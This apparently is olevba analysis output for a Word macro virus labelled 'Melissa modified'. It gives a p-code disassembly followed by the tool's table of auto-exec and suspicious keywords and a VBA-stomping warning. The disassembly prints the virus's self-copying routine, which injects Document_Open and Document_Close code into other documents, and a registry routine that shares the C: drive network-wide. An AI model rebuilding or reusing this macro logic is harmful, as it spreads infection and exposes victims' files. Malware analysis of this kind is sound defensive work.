' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #138:
' 	Ld ADCL 
' 	LitDI2 0x0003 
' 	Sub 
' 	LitStr 0x000E "Document_Close"
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #139:
' 	EndIfBlock 
' Line #140:
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #141:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #142:
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #143:
' 	Loop 
' Line #144:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #145:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #146:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #147:
' 	Loop 
' Line #148:
' 	LitDI2 0x0007 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #149:
' 	LitDI2 0x0007 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #150:
' 	Ld NTCL 
' 	LitDI2 0x0003 
' 	Sub 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #151:
' 	Ld NTCL 
' 	LitDI2 0x0003 
' 	Sub 
' 	LitStr 0x000D "Document_Open"
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #152:
' 	EndIfBlock 
' Line #153:
' 	Label CYA 
' Line #154:
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #155:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #156:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #157:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #158:
' 	EndFunc 
' Line #159:
' 	FuncDefn (Private Function ShareDriveC(id_FFFE As Variant))
' Line #160:
' 	LitDI2 0x0001 
' 	St ValString 
' Line #161:
' 	LitDI2 0x0003 
' 	St ValBinary 
' Line #162:
' 	LitDI2 0x0004 
' 	St ValDWord 
' Line #163:
' 	LitHI4 0x0002 0x8000 
' 	St HKEY_LOCAL_MACHINE 
' Line #164:
' 	LitStr 0x003B "Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C\"
' 	St Key1 
' Line #165:
' 	Ld HKEY_LOCAL_MACHINE 
' 	Ld Key1 
' 	LitStr 0x0005 "Flags"
' 	Ld ValDWord 
' 	LitStr 0x0003 "770"
' 	ArgsCall WriteRegistry 0x0005 
' Line #166:
' 	Ld HKEY_LOCAL_MACHINE 
' 	Ld Key1 
' 	LitStr 0x0008 "Parm1enc"
' 	Ld ValBinary 
' 	LitStr 0x0000 ""
' 	ArgsCall WriteRegistry 0x0005 
' Line #167:
' 	Ld HKEY_LOCAL_MACHINE 
' 	Ld Key1 
' 	LitStr 0x0008 "Parm2enc"
' 	Ld ValBinary 
' 	LitStr 0x0000 ""
' 	ArgsCall WriteRegistry 0x0005 
' Line #168:
' 	Ld HKEY_LOCAL_MACHINE 
' 	Ld Key1 
' 	LitStr 0x0004 "Path"
' 	Ld ValString 
' 	LitStr 0x0003 "C:\"
' 	ArgsCall WriteRegistry 0x0005 
' Line #169:
' 	Ld HKEY_LOCAL_MACHINE 
' 	Ld Key1 
' 	LitStr 0x0006 "Remark"
' 	Ld ValString 
' 	LitStr 0x0009 "MelissaFX"
' 	ArgsCall WriteRegistry 0x0005 
' Line #170:
' 	Ld HKEY_LOCAL_MACHINE 
' 	Ld Key1 
' 	LitStr 0x0004 "Type"
' 	Ld ValDWord 
' 	LitStr 0x0001 "0"
' 	ArgsCall WriteRegistry 0x0005 
' Line #171:
' 	EndFunc 
' Line #172:
' 	FuncDefn (Private Sub WriteRegistry(ByVal Group As Long, ByVal Section As String, ByVal Key As String, ByVal ValType As Long, ByVal Value As Variant))
' Line #173:
' 	Dim 
' 	VarDefn lResult (As Long)
' Line #174:
' 	Dim 
' 	VarDefn lKeyValue (As Long)
' Line #175:
' 	Dim 
' 	VarDefn InLen (As Long)
' Line #176:
' 	Dim 
' 	VarDefn lNewVal (As Long)
' Line #177:
' 	Dim 
' 	VarDefn sNewVal (As String)
' Line #178:
' 	OnError (Resume Next) 
' Line #179:
' 	Ld Group 
' 	Ld Section 
' 	Ld lKeyValue 
' 	ArgsLd RegCreateKey 0x0003 
' 	St lResult 
' Line #180:
' 	Ld ValType 
' 	LitDI2 0x0004 
' 	Eq 
' 	Ld ValType 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #181:
' 	Ld Value 
' 	Coerce (Lng) 
' 	St lNewVal 
' Line #182:
' 	Ld ValType 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0004 
' 	St InLen 
' 	EndIf 
' Line #183:
' 	Ld lKeyValue 
' 	Ld Key 
' 	LitDI4 0x0000 0x0000 
' 	Ld ValType 
' 	Ld lNewVal 
' 	Ld InLen 
' 	ArgsLd RegSetValueExLong 0x0006 
' 	St lResult 
' Line #184:
' 	ElseBlock 
' Line #185:
' 	Ld ValType 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Value 
' 	LitDI2 0x0000 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Value 
' 	EndIf 
' Line #186:
' 	Ld Value 
' 	St sNewVal 
' Line #187:
' 	Ld sNewVal 
' 	FnLen 
' 	St InLen 
' Line #188:
' 	Ld lKeyValue 
' 	Ld Key 
' 	LitDI4 0x0000 0x0000 
' 	LitDI4 0x0001 0x0000 
' 	Ld sNewVal 
' 	Ld InLen 
' 	ArgsLd RegSetValueExString 0x0006 
' 	St lResult 
' Line #189:
' 	EndIfBlock 
' Line #190:
' 	Ld lKeyValue 
' 	ArgsLd RegFlushKey 0x0001 
' 	St lResult 
' Line #191:
' 	Ld lKeyValue 
' 	ArgsLd RegCloseKey 0x0001 
' 	St lResult 
' Line #192:
' 	EndSub 
' Line #193:
' 	FuncDefn (Private Sub ViewVBCode())
' Line #194:
' 	EndSub 
' Line #195:
' 	FuncDefn (Private Sub AutoExit())
' Line #196:
' 	ArgsCall Document_Open 0x0000 
' Line #197:
' 	EndSub 
' Line #198:
' 	QuoteRem 0x0000 0x0021 "Melissa modified, !helob aisyalaM"
' Line #199:
' Line #200:
' Line #201:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|Base64    |~)^                 |file                                         |
|String    |                    |                                             |
|Base64    |O*^                 |Type                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

